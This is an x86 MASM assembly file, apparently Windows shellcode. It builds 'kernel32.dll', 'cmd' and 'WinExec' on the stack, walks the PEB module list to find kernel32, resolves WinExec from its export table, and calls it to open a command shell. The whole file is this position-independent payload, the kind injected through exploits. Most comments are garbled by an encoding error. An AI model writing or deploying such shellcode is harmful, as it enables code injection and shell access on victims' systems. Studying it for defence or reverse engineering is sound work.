		.386
		.model flat,stdcall
		option casemap:none

		.code
	
start:

		assume fs:nothing
		pushad
		sub esp,40
		
		xor eax,eax
		mov cl,40
		lea edi,[esp]
		rep stosb
														;unicode(kernel32.dll)
		mov byte ptr[esp],6bh					;k
		mov byte ptr[esp+2],65h					;e
		mov byte ptr[esp+4],72h					;r
		mov byte ptr[esp+6],6eh					;n
		mov byte ptr[esp+8],65h					;e
		mov byte ptr[esp+10],6ch				;l
		mov byte ptr[esp+12],33h				;3
		mov byte ptr[esp+14],32h				;2

		mov byte ptr[esp+16],63h				;c
		mov byte ptr[esp+17],6dh				;m
		mov byte ptr[esp+18],64h				;d

		mov dword ptr[esp+20],456e6957h		;WinE
		mov byte ptr[esp+24],78h				;x
		mov byte ptr[esp+25],65h				;e
		mov byte ptr[esp+26],63h				;c


	   mov edx,fs:[eax+30h] 		;PEB
	   mov edx,[edx+0ch] 			;PEB_LDR_DATA
	   add edx,1ch 					;InInitializationOrderModuleList-->LDR_MODULE
	   mov eax,edx						;��˫������ͷָ�뱣��,��������ѭ��
	   
NextModule:
		xor ecx,ecx
		mov edx,[edx+ecx]				;ѭ���������нڵ�
		cmp eax,edx						;�жϵ�ǰ�Ľڵ�ָ���Ƿ���˫������ͷָ����ȣ���ȵĻ��ͱ�ʾû�ҵ�
		je	 GoRet						;ѭ������˫������û�ҵ�������
		mov esi,[edx+20h]   			;��ȡUNICODE_STRING�ṹ��PWSTR �ַ���
		lea edi,[esp]					;��ջ��Kernel32.dll��unicode�ַ���
		mov cl,16						;Kernel32���ַ�������
		repz cmpsb						;�Ƚ��Ƿ����kernel32.dll��unicode��
		test ecx,ecx
		jnz NextModule
		
		;eax -->  IMAGE_DOS_HEADERS
 		mov eax,[edx+8] 				;eax --> LDR_MODULE�ṹ����ַbaseAddress,��kernel32.dll��ģ���ַ				
 		mov edx,[edx+8]
		;eax -->  IMAGE_NT_HEADERS		
		add eax,[eax+3Ch]
		;eax -->  IMAGE_EXPORT_DIRECTORY									
		mov eax,[eax+78h]				;OptionalHeader.DataDirectory.VirtualAddress
		add eax,edx
		mov ebx,[eax+20h]				;AddressOfNames
		adc ebx,edx						;ebxָ�������ַ���
		
		mov ecx,[eax+18h]				;NumberOfNames
		
NextFuncName:
		mov edi,[ebx]
		add edi,edx
		lea esi,[esp+20]				;��ջ�е� 'WinExec',0
		push ecx
		mov cl,8							;WinExec���ַ������ȣ�������β��0
		repz cmpsb						;�Ƚ�ES:[ESI]��ES:[EDI]��ÿһ���ַ�
		test ecx,ecx
		pop ecx
		jz GetFuncAddr					;�ҵ�WinExec�ַ���
		add ebx,4						;ÿһ��RVAռ4�ֽ�
		loop NextFuncName
		jmp GoRet
		
		
GetFuncAddr:
		sub ebx,edx
		sub ebx,[eax+20h]				;AddressOfNames
		shr ebx,1
		add ebx,[eax+24h]				;AddressOfNameOrdinals
		add ebx,edx
		movzx ecx,WORD ptr [ebx]	;2�ֽڵĵ����������
		shl ecx,2
		add ecx,[eax+1ch]				;AddressOfFunctions
		add ecx,edx
		mov ecx,[ecx]					;����RVA	
		add ecx,edx						;����VA

		;����WinExec
		lea ebx,[esp+16]				;��ջ�е� 	'cmd',0
		push 1							;SW_NORMAL	equ 1
		push ebx
		call ecx
		
GoRet:
		add esp,40
		popad
		
		ret
		end start